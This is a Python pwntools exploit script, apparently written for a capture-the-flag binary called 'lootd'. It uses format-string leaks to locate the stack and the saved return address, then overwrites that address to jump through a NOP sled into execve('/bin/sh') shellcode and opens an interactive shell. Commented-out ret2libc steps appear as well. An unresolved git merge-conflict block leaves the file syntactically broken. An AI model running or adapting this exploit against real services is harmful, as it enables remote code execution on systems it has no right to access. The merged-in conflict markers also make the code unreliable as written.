#!/usr/bin/env python3
from pwn import ELF, remote, p64, context, shellcraft, asm

# http://shell-storm.org/shellcode/files/shellcode-77.php
sc = b'\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'

nop = b'\x90'
nops = nop*150

<<<<<<< HEAD
local = False
=======
#local = False
>>>>>>> 46e9d962bc922468bd2f303e40a8ad48f871d264
local = True
if local:
    elf = ELF('lootd')
    s = elf.process()
else:
    host, port = 'cloud-c2-70', 1337
    s = remote(host,port)

s.recvuntil('> ')
s.sendline('%p')        # first item on stack point to memory location a fixed distance from program start
mem = s.recv()
mem = mem[27:41] # last printed address
mem = int(mem.decode(),16)
print('stack mem: ', hex(mem))
#b1 = hex( -(0x10a7 + 0x1040) + 0x1b0e + mem) # used to simplify entering breakpoint into gdb
#b2 = hex( -(0x10a7 + 0x1040) + 0x19d3 + mem)
mem = hex(mem  - (0x10a7 + 0x1040) + 0x175b)
#print('uptime mem: ', mem)
#print('b1&2:\nb *', b1, sep="")
#print('b *', b2, sep="")

s.sendline('%p%p%p%p%p %p')         # this 6th value on the stack is the address used by ret when returning from (didnt note this)
stack = s.recv()
stack = stack[-18:-4]
stack = int(stack.decode(), 16)
stack_rip = hex(stack + 0x88)
print('stack rip: ', stack_rip)

#s.sendline('%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p %p') # this 27th? value on the stack is an address fixed distance from libc addressing
#mem_lib = s.recv()                                                    # but ended ut not using ret2libc further
#mem_lib = mem_lib[-18:-4]
#mem_lib = int(mem_lib, 16)
#mem_sys = hex(mem_lib + 0x2efa5)                                       # system()
#bin_sh = hex(mem_lib + 0x8a8b7)                                        #  "/bin/sh" gadget 
#print('system mem: ', mem_sys)
#print('/bin/sh: ', bin_sh)

padding =b'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p %p AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS'

# input("attach gdb and press")         # when debugging locally use this to wait while you attach gdb

uptime = p64(int(mem,16))
#system = p64(int(mem_sys, 16))
#bin_sh = p64(int(bin_sh, 16))
rip = p64(int(stack_rip, 16))
rip4 = p64(int(stack_rip, 16) + 40)     # add 40 to hopefully land in the nop-slide

print('sending stuff...')

s.sendline(padding + rip4 +         # rip4 was off by one qw, therefoe added another rip4 instead of adjusting padding
        rip4 + nops + sc)

print('stuff sent.')

s.interactive()     # get shell :)
s.close()
